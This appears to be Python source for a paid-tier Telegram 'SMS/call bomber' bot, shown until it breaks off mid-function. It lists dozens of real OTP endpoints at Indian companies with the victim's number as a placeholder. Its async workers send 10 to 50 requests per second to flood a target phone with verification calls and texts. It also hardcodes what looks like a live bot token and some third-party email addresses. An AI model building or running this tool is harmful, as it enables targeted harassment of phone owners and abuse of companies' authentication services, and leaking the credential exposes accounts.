import asyncio
import logging
import aiohttp
import json
import time
import os
from datetime import datetime, timedelta
from typing import Dict, List, Optional
import threading
import csv
import io

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, 
    CallbackQueryHandler, ContextTypes, filters
)
from telegram.constants import ParseMode, ChatMemberStatus

# Import database
from database import Database

# ==================== CONFIGURATION ====================
# Use environment variables for Railway
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8526792242:AAHWUcIbXTr0tnVveVYrV8GZMgiv7Qj47ng")
LOGGING_CHAT_ID = int(os.environ.get("LOGGING_CHAT_ID", "-1002939205294"))
ADMIN_IDS = [int(id.strip()) for id in os.environ.get("ADMIN_IDS", "7290031191").split(",")]
CHANNEL_USERNAME = "@silent_methodss"

# Bot Developer Credit
BOT_DEVELOPER = "@silent_is_back"
BOT_VERSION = "4.0.0"

# Speed Configuration (requests per second)
FREE_SPEED = 10    # 10 req/sec for free users (1 minute session)
PREMIUM_SPEED = 30  # 30 req/sec for premium users (4 hours session)  
ULTRA_SPEED = 50    # 50 req/sec for ultra users (24 hours session)

# ==================== COMPLETE APIS CONFIGURATION ====================
APIS = {
    "call": {
        "91": [
            {
                "name": "1mg-call",
                "method": "POST",
                "url": "https://www.1mg.com/auth_api/v6/create_token",
                "headers": {
                    "content-type": "application/json; charset=utf-8",
                    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
                },
                "json": {
                    "number": "{target}",
                    "is_corporate_user": False,
                    "otp_on_call": True
                },
                "priority": 1
            },
            {
                "name": "tatacapital-call",
                "method": "POST",
                "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
                "headers": {
                    "content-type": "application/json"
                },
                "json": {
                    "phone": "{target}",
                    "applSource": "",
                    "isOtpViaCallAtLogin": "true"
                },
                "priority": 1
            },
            {
                "name": "swiggy-call",
                "method": "POST",
                "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "Swiggy-Android"
                },
                "json": {
                    "mobile": "{target}"
                },
                "priority": 1
            },
            {
                "name": "rapido-call",
                "method": "POST",
                "url": "https://rapido.bike/api/1/request_otp",
                "headers": {
                    "content-type": "application/json; charset=utf-8",
                    "user-agent": "okhttp/3.9.1"
                },
                "json": {
                    "phone": "{target}",
                    "call": True
                },
                "priority": 1
            }
        ]
    },
    "sms": {
        "91": [
            {
                "name": "lendingplate",
                "method": "POST",
                "url": "https://lendingplate.com/api.php",
                "headers": {
                    "Connection": "keep-alive",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Origin": "https://lendingplate.com",
                    "Referer": "https://lendingplate.com/personal-loan"
                },
                "data": {
                    "mobiles": "{target}",
                    "resend": "Resend",
                    "clickcount": "3"
                },
                "priority": 2
            },
            {
                "name": "daycoindia",
                "method": "POST",
                "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Origin": "https://ekyc.daycoindia.com",
                    "Referer": "https://ekyc.daycoindia.com/verify_otp.php"
                },
                "data": {
                    "api": "send_otp",
                    "brand": "dayco",
                    "mob": "{target}",
                    "resend_otp": "resend_otp"
                },
                "priority": 2
            },
            {
                "name": "nobroker",
                "method": "POST",
                "url": "https://www.nobroker.in/api/v3/account/otp/send",
                "headers": {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "origin": "https://www.nobroker.in",
                    "referer": "https://www.nobroker.in/"
                },
                "data": {
                    "phone": "{target}",
                    "countryCode": "IN"
                },
                "priority": 2
            },
            {
                "name": "shiprocket",
                "method": "POST",
                "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
                "headers": {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "origin": "https://app.shiprocket.in",
                    "referer": "https://app.shiprocket.in/"
                },
                "json": {
                    "mobileNumber": "{target}"
                },
                "priority": 2
            },
            {
                "name": "gokwik",
                "method": "POST",
                "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
                "headers": {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                    "Accept": "application/json, text/plain, */*",
                    "Content-Type": "application/json",
                    "origin": "https://pdp.gokwik.co",
                    "referer": "https://pdp.gokwik.co/"
                },
                "json": {
                    "phone": "{target}",
                    "country": "in"
                },
                "priority": 2
            },
            {
                "name": "gopinkcabs",
                "method": "POST",
                "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Origin": "https://www.gopinkcabs.com",
                    "Referer": "https://www.gopinkcabs.com/app/cab/customer/step1.php",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
                },
                "data": {
                    "check_mobile_number": "1",
                    "contact": "{target}"
                },
                "priority": 2
            },
            {
                "name": "shemaroome",
                "method": "POST",
                "url": "https://www.shemaroome.com/users/resend_otp",
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Origin": "https://www.shemaroome.com",
                    "Referer": "https://www.shemaroome.com/users/sign_in",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
                },
                "data": {
                    "mobile_no": "+91{target}"
                },
                "priority": 2
            },
            {
                "name": "khatabook",
                "method": "POST",
                "url": "https://api.khatabook.com/v1/auth/request-otp",
                "headers": {
                    "content-type": "application/json; charset=utf-8",
                    "user-agent": "okhttp/3.9.1"
                },
                "json": {
                    "app_signature": "Jc/Zu7qNqQ2",
                    "country_code": "+91",
                    "phone": "{target}"
                },
                "priority": 2
            },
            {
                "name": "hungama",
                "method": "POST",
                "url": "https://communication.api.hungama.com/v1/communication/otp",
                "headers": {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                    "Accept": "application/json, text/plain, */*",
                    "Content-Type": "application/json",
                    "origin": "https://www.hungama.com",
                    "referer": "https://www.hungama.com/"
                },
                "json": {
                    "mobileNo": "{target}",
                    "countryCode": "+91",
                    "appCode": "un",
                    "messageId": "1",
                    "device": "web"
                },
                "priority": 2
            },
            {
                "name": "servetel",
                "method": "POST",
                "url": "https://api.servetel.in/v1/auth/otp",
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)"
                },
                "data": {
                    "mobile_number": "{target}"
                },
                "priority": 2
            },
            {
                "name": "smytten",
                "method": "POST",
                "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
                "headers": {
                    "Content-Type": "application/json",
                    "Origin": "https://smytten.com",
                    "Referer": "https://smytten.com/",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
                },
                "json": {
                    "phone": "{target}",
                    "email": "sdhabai09@gmail.com",
                    "device_platform": "web"
                },
                "priority": 2
            },
            {
                "name": "pokerbaazi",
                "method": "POST",
                "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
                "headers": {
                    "content-type": "application/json; charset=utf-8",
                    "user-agent": "okhttp/3.9.1"
                },
                "json": {
                    "mfa_channels": {
                        "phno": {
                            "number": "{target}",
                            "country_code": "+91"
                        }
                    }
                },
                "priority": 2
            },
            {
                "name": "nuvamawealth",
                "method": "POST",
                "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "emailID": "paul04964@gmail.com",
                    "mobileNo": "{target}",
                    "firstName": "Shiva Riy",
                    "countryCode": "91",
                    "req": "generate"
                },
                "priority": 2
            },
            {
                "name": "getswipe",
                "method": "POST",
                "url": "https://app.getswipe.in/api/user/mobile_login",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "resend": 0.0,
                    "mobile": "{target}"
                },
                "priority": 2
            },
            {
                "name": "brevistay",
                "method": "POST",
                "url": "https://www.brevistay.com/cst/app-api/login",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "is_otp": 1.0,
                    "mobile": "{target}",
                    "is_password": 0.0
                },
                "priority": 2
            },
            {
                "name": "shopsy",
                "method": "POST",
                "url": "https://www.shopsy.in/api/1/action/view",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "actionRequestContext": {
                        "type": "LOGIN_IDENTITY_VERIFY",
                        "loginIdPrefix": "+91",
                        "loginId": "{target}",
                        "loginType": "MOBILE",
                        "verificationType": "OTP"
                    }
                },
                "priority": 2
            },
            {
                "name": "dream11",
                "method": "POST",
                "url": "https://www.dream11.com/auth/passwordless/init",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "phoneNumber": "{target}",
                    "templateName": "default",
                    "channel": "sms",
                    "flow": "SIGNIN"
                },
                "priority": 2
            },
            {
                "name": "snapdeal",
                "method": "POST",
                "url": "https://m.snapdeal.com/sendOTP",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "purpose": "LOGIN_WITH_MOBILE_OTP",
                    "mobileNumber": "{target}"
                },
                "priority": 2
            },
            {
                "name": "doubtnut",
                "method": "POST",
                "url": "https://api.doubtnut.com/v4/student/login",
                "headers": {
                    "version_code": "1160",
                    "content-type": "application/json; charset=utf-8",
                    "user-agent": "okhttp/5.0.0-alpha.2"
                },
                "json": {
                    "phone_number": "{target}",
                    "language": "en",
                    "app_version": "7.10.51"
                },
                "priority": 2
            },
            {
                "name": "justdial",
                "method": "POST",
                "url": "https://www.justdial.com/functions/whatsappverification.php",
                "params": {
                    "name": "Hi Jistididi",
                    "rsend": "0",
                    "mob": "{target}"
                },
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "okhttp/3.9.1"
                },
                "priority": 2
            },
            {
                "name": "liquide",
                "method": "GET",
                "url": "https://api.v2.liquide.life/api/auth/checkNumber/+91{target}?otpLogin=true",
                "headers": {
                    "User-Agent": "okhttp/3.9.1"
                },
                "priority": 2
            },
            {
                "name": "dehaat",
                "method": "POST",
                "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "mobile_number": "{target}",
                    "client_id": "kisan-app"
                },
                "priority": 2
            },
            {
                "name": "apna",
                "method": "POST",
                "url": "https://production.apna.co/api/userprofile/v1/otp/",
                "headers": {
                    "content-type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "retries": 0,
                    "phone_number": "91{target}",
                    "source": "employer",
                    "hash_type": "employer"
                },
                "priority": 2
            },
            {
                "name": "housing.com",
                "method": "POST",
                "url": "https://mightyzeus.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_LOGIN&isBot=false&source=mobile",
                "headers": {
                    "Content-Type": "application/json",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "query": "mutation($email: String, $phone: String, $otpLength: Int) {\n  sendOtp(phone: $phone, email: $email, otpLength: $otpLength) {\n    success\n    message\n  }\n}",
                    "variables": {
                        "phone": "{target}"
                    }
                },
                "priority": 2
            },
            {
                "name": "bigbasket",
                "method": "POST",
                "url": "https://www.bigbasket.com/auth/send-otp/?v=5.90.0",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "phone": "{target}",
                    "login_type": "otp"
                },
                "priority": 2
            },
            {
                "name": "zomato",
                "method": "POST",
                "url": "https://www.zomato.com/php/oauth_login_modal_submit",
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
                },
                "data": {
                    "phone": "{target}",
                    "login_type": "otp"
                },
                "priority": 2
            },
            {
                "name": "flipkart",
                "method": "POST",
                "url": "https://2.rome.api.flipkart.com/api/5/user/otp/generate",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "phoneNumber": "{target}"
                },
                "priority": 2
            },
            {
                "name": "paytm",
                "method": "POST",
                "url": "https://accounts.paytm.com/signin/otp",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "phone": "{target}",
                    "countryCode": "91"
                },
                "priority": 2
            },
            {
                "name": "phonepe",
                "method": "POST",
                "url": "https://api.phonepe.com/apis/hermes/login/send_otp",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "phone": "{target}"
                },
                "priority": 2
            },
            {
                "name": "mpl",
                "method": "POST",
                "url": "https://mpl.prod.s2p.in/api/v1/verification/otp",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "mobile": "{target}"
                },
                "priority": 2
            },
            {
                "name": "myntra",
                "method": "POST",
                "url": "https://www.myntra.com/gw/mobile-auth/otp/generate",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "mobile": "{target}"
                },
                "priority": 2
            },
            {
                "name": "rapido",
                "method": "POST",
                "url": "https://rapido.bike/api/1/request_otp",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "phone": "{target}"
                },
                "priority": 2
            },
            {
                "name": "ola",
                "method": "POST",
                "url": "https://api.olacabs.com/v1/auth/send_otp",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "phone": "{target}"
                },
                "priority": 2
            },
            {
                "name": "dominos",
                "method": "POST",
                "url": "https://order.g.dominos.co.in/order-api/auth/send-otp",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "phone": "{target}"
                },
                "priority": 2
            },
            {
                "name": "netmeds",
                "method": "POST",
                "url": "https://www.netmeds.com/auth/send-otp",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "mobile": "{target}"
                },
                "priority": 2
            },
            {
                "name": "pharmeasy",
                "method": "POST",
                "url": "https://pharmeasy.in/api/auth/send_otp",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "mobile": "{target}"
                },
                "priority": 2
            },
            {
                "name": "tataneu",
                "method": "POST",
                "url": "https://api.tataneu.com/v2/auth/send-otp",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "phone": "{target}"
                },
                "priority": 2
            },
            {
                "name": "jiomart",
                "method": "POST",
                "url": "https://www.jiomart.com/api/auth/send-otp",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "mobile": "{target}"
                },
                "priority": 2
            },
            {
                "name": "blinkit",
                "method": "POST",
                "url": "https://blinkit.com/api/auth/send-otp",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "phone": "{target}"
                },
                "priority": 2
            },
            {
                "name": "bharatpe",
                "method": "POST",
                "url": "https://api.bharatpe.com/v1/auth/send-otp",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "phone": "{target}"
                },
                "priority": 2
            },
            {
                "name": "cashfree",
                "method": "POST",
                "url": "https://api.cashfree.com/verification/otp/send",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "phone": "{target}"
                },
                "priority": 2
            },
            {
                "name": "razorpay",
                "method": "POST",
                "url": "https://api.razorpay.com/v1/otp/send",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "contact": "{target}"
                },
                "priority": 2
            },
            {
                "name": "cred",
                "method": "POST",
                "url": "https://api.cred.club/api/v2/auth/send-otp",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "phone": "{target}"
                },
                "priority": 2
            },
            {
                "name": "upstox",
                "method": "POST",
                "url": "https://api.upstox.com/v2/login/otp/send",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "mobile": "{target}"
                },
                "priority": 2
            },
            {
                "name": "groww",
                "method": "POST",
                "url": "https://api.groww.in/v1/user/otp/send",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "mobile": "{target}"
                },
                "priority": 2
            },
            {
                "name": "policybazaar",
                "method": "POST",
                "url": "https://www.policybazaar.com/api/auth/sendOtp",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "mobile": "{target}"
                },
                "priority": 2
            },
            {
                "name": "acko",
                "method": "POST",
                "url": "https://api.acko.com/auth/send-otp",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "phone": "{target}"
                },
                "priority": 2
            }
        ]
    }
}

# ==================== INITIALIZATION ====================
db = Database()
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Store active bombing sessions
active_sessions = {}
user_states = {}

# ==================== HELPER FUNCTIONS ====================
async def check_channel_membership(context: ContextTypes.DEFAULT_TYPE, user_id: int) -> bool:
    """Check if user is member of required channel"""
    try:
        member = await context.bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]
    except Exception as e:
        logger.error(f"Error checking channel membership: {e}")
        return False

async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Check and enforce channel join"""
    user_id = update.effective_user.id
    
    # Skip check for admins
    if user_id in ADMIN_IDS:
        return True
    
    is_member = await check_channel_membership(context, user_id)
    
    if not is_member:
        join_message = f"""
🔒 <b>Channel Membership Required</b>

⚠️ You must join our channel to use this bot.

📢 Channel: {CHANNEL_USERNAME}

Please join the channel and try again.
"""
        
        keyboard = [
            [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
            [InlineKeyboardButton("✅ I've Joined", callback_data="check_join")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if update.callback_query:
            await update.callback_query.message.reply_text(join_message, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(join_message, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
        
        return False
    
    return True

async def log_action(context: ContextTypes.DEFAULT_TYPE, action: str, user: dict = None, target: str = None):
    """Log user actions to the logging group"""
    try:
        if user:
            message = f"👤 User Action\n\n"
            message += f"Name: {user.get('first_name', 'Unknown')} {user.get('last_name', '')}\n"
            message += f"Username: @{user.get('username', 'No username')}\n"
            message += f"Chat ID: {user.get('id', 'N/A')}\n"
            message += f"Action: {action}\n"
            if target:
                message += f"Target: {target}"
        else:
            message = action
        
        await context.bot.send_message(
            chat_id=LOGGING_CHAT_ID,
            text=message
        )
    except Exception as e:
        logger.error(f"Failed to log action: {e}")

async def make_api_request(session: aiohttp.ClientSession, api_config: dict, target: str) -> bool:
    """Make a single API request - OPTIMIZED"""
    try:
        url = api_config['url']
        method = api_config['method']
        
        # Prepare headers
        headers = api_config.get('headers', {}).copy()
        
        if method == 'POST':
            if 'json' in api_config:
                json_data = api_config['json'].copy()
                # Fast replacement
                json_str = str(json_data).replace('{target}', target)
                json_data = json.loads(json_str.replace("'", '"'))
                
                async with session.post(url, json=json_data, headers=headers, timeout=5) as response:
                    status = response.status
                    await response.read()
                    return status in [200, 201, 202]
            
            elif 'data' in api_config:
                data = api_config['data'].copy()
                # Fast replacement
                for key in data:
                    if isinstance(data[key], str):
                        data[key] = data[key].replace('{target}', target)
                async with session.post(url, data=data, headers=headers, timeout=5) as response:
                    status = response.status
                    await response.read()
                    return status in [200, 201, 202]
        
        elif method == 'GET':
            if 'params' in api_config:
                params = api_config['params'].copy()
                # Fast replacement
                for key in params:
                    if isinstance(params[key], str):
                        params[key] = params[key].replace('{target}', target)
            else:
                params = {}
            
            # Replace {target} in URL
            url = url.replace('{target}', target) if '{target}' in url else url
            async with session.get(url, params=params, headers=headers, timeout=5) as response:
                status = response.status
                await response.read()
                return status == 200
        
        return False
    except Exception as e:
        logger.debug(f"API request failed for {api_config.get('name', 'Unknown')}: {e}")
        return False

async def bombing_worker(session_id: int, target: str, country_code: str, duration: int, 
                        context: ContextTypes.DEFAULT_TYPE, chat_id: int, plan: str):
    """Worker function for bombing session - HIGH SPEED (10-50 req/sec)"""
    start_time = time.time()
    end_time = start_time + duration
    requests_sent = 0
    successful = 0
    
    # Get speed based on plan
    if plan == "free":
        speed = FREE_SPEED
        cooldown = 0.1  # 10 req/sec
        batch_size = 2
    elif plan == "premium":
        speed = PREMIUM_SPEED
        cooldown = 0.033  # 30 req/sec
        batch_size = 5
    elif plan == "ultra":
        speed = ULTRA_SPEED
        cooldown = 0.02  # 50 req/sec
        batch_size = 10
    else:
        speed = FREE_SPEED
        cooldown = 0.1
        batch_size = 2
    
    # Get APIs for this country
    call_apis = APIS['call'].get(country_code, [])
    sms_apis = APIS['sms'].get(country_code, [])
    
    # Combine APIs (call first, then SMS)
    all_apis = call_apis + sms_apis
    
    if not all_apis:
        logger.error(f"No APIs found for country code: {country_code}")
        await context.bot.send_message(chat_id=chat_id, text="❌ No APIs available for this country code.")
        return
    
    session_data = {
        'active': True,
        'start_time': start_time,
        'requests_sent': 0,
        'successful': 0,
        'api_stats': {},
        'chat_id': chat_id,
        'target': target,
        'speed': speed,
        'status_lock': asyncio.Lock(),
        'last_update': start_time,
        'last_db_update': start_time
    }
    active_sessions[session_id] = session_data
    
    try:
        async with aiohttp.ClientSession() as http_session:
            api_index = 0
            
            while time.time() < end_time and session_data['active']:
                batch_start = time.time()
                tasks = []
                
                # Create batch of concurrent requests
                for _ in range(batch_size):
                    if not session_data['active']:
                        break
                    
                    # Get next API
                    api = all_apis[api_index % len(all_apis)]
                    api_index += 1
                    
                    # Create async task for request
                    task = asyncio.create_task(
                        process_single_request_fast(http_session, api, target, session_data, session_id)
                    )
                    tasks.append(task)
                
                # Wait for batch to complete
                if tasks:
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    for result in results:
                        if isinstance(result, bool) and result:
                            successful += 1
                    requests_sent += len(tasks)
                
                # Send status update every 3 seconds
                current_time = time.time()
                if current_time - session_data['last_update'] >= 3:
                    await send_bombing_update(
                        context, chat_id, session_id, target, start_time, 
                        duration, requests_sent, successful, plan, speed
                    )
                    session_data['last_update'] = current_time
                
                # Update database every 50 requests
                if requests_sent - session_data.get('last_db_count', 0) >= 50:
                    db.update_bombing_stats(session_id, 50, successful)
                    session_data['last_db_count'] = requests_sent
                
                # Calculate batch time and apply cooldown
                batch_time = time.time() - batch_start
                if batch_time < cooldown and session_data['active']:
                    await asyncio.sleep(cooldown - batch_time)
    
    except Exception as e:
        logger.error(f"Bombing worker error: {e}")
    finally:
        # Final database update
        if session_data['active']:
            db.update_bombing_stats(session_id, requests_sent, successful)
            session_data['active'] = False
            db.end_bombing_session(session_id)
        
        # Send completion message
        try:
            elapsed = time.time() - start_time
            success_rate = (successful / requests_sent * 100) if requests_sent > 0 else 0
            
            completion_msg = f"""
✅ <b>Bombing Session Completed</b>

📱 <b>Target:</b> {target}
📊 <b>Total Requests:</b> {requests_sent:,}
✅ <b>Successful:</b> {successful:,}
📈 <b>Success Rate:</b> {success_rate:.1f}%
⏱ <b>Duration:</b> {int(elapsed)} seconds
⚡ <b>Average Speed:</b> {requests_sent/max(1, elapsed):.1f} reqs/sec
🔥 <b>Max Speed:</b> {speed} reqs/sec

<b>Plan Used:</b> {plan.capitalize()}
<b>Total APIs:</b> {len(all_apis)}
<b>👨‍💻 Developer:</b> {BOT_DEVELOPER}
"""
            await context.bot.send_message(
                chat_id=chat_id, 
                text=completion_msg, 
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            logger.error(f"Failed to send completion message: {e}")
        
        # Cleanup session data
        if session_id in active_sessions:
            del active_sessions[session_id]

async def process_single_request_fast(session: aiohttp.ClientSession, api: dict, target: str, session_data: dict, session_id: int):
    """Process a single API request - FAST VERSION"""
    try:
        success = await make_api_request(session, api, target)
        
        async with session_data['status_lock']:
            session_data['requests_sent'] += 1
            if success:
                session_data['successful'] += 1
                api_name = api['name']
                if api_name not in session_data['api_stats']:
                    session_data['api_stats'][api_name] = {'attempts': 0, 'success': 0}
                session_data['api_stats'][api_name]['attempts'] += 1
                session_data['api_stats'][api_name]['success'] += 1
            else:
                api_name = api['name']
                if api_name not in session_data['api_stats']:
                    session_data['api_stats'][api_name] = {'attempts': 0, 'success': 0}
                session_data['api_stats'][api_name]['attempts'] += 1
        
        return success
    except Exception as e:
        logger.debug(f"Error processing request for {api['name']}: {e}")
        return False

async def send_bombing_update(context: ContextTypes.DEFAULT_TYPE, chat_id: int, session_id: int, target: str, 
                              start_time: float, duration: int, requests_sent: int, successful: int, plan: str, speed: int):
    """Send bombing status update"""
    try:
        if session_id not in active_sessions:
            return
        
        elapsed = int(time.time() - start_time)
        remaining = max(0, duration - elapsed)
        
        # Calculate progress
        progress = min(100, int((elapsed / duration) * 100))
        progress_bar = "█" * (progress // 10) + "░" * (10 - (progress // 10))
        
        success_rate = (successful / requests_sent * 100) if requests_sent > 0 else 0
        
        # Calculate current speed
        current_speed = requests_sent / elapsed if elapsed > 0 else 0
        
        # Prepare API status
        api_status_text = ""
        if session_id in active_sessions:
            session_data = active_sessions[session_id]
            if session_data['api_stats']:
                api_status_text = "<b>📊 Top APIs:</b>\n"
                sorted_apis = sorted(
                    session_data['api_stats'].items(),
                    key=lambda x: (x[1]['success'] / x[1]['attempts']) if x[1]['attempts'] > 0 else 0,
                    reverse=True
                )[:3]
                
                for api_name, stats in sorted_apis:
                    api_success_rate = (stats['success'] / stats['attempts'] * 100) if stats['attempts'] > 0 else 0
                    api_status_text += f"• {api_name}: {stats['attempts']} att, {api_success_rate:.0f}%\n"
        
        if not api_status_text:
            api_status_text = "• Starting Voice OTP calls...\n• Then SMS bombing..."
        
        message = f"""
🚀 <b>Live Bombing Status</b>

📱 <b>Target:</b> {target}
🔄 <b>Status:</b> 🟢 <b>ACTIVE</b>
📊 <b>Progress:</b> {progress_bar} {progress}%
⏱ <b>Time elapsed:</b> {elapsed//60}m {elapsed%60}s
⏳ <b>Time remaining:</b> {remaining//60}m {remaining%60}s
📨 <b>Requests sent:</b> {requests_sent:,}
✅ <b>Successful:</b> {successful:,}
📈 <b>Success rate:</b> {success_rate:.1f}%
⚡ <b>Current Speed:</b> <b>{current_speed:.1f} reqs/sec</b>
🔥 <b>Max Speed:</b> {speed} reqs/sec

{api_status_text}

<b>Plan:</b> {plan.capitalize()} (30 days expiry)
<b>👨‍💻 Developer:</b> {BOT_DEVELOPER}
"""
        
        # Create keyboard with stop button
        keyboard = [
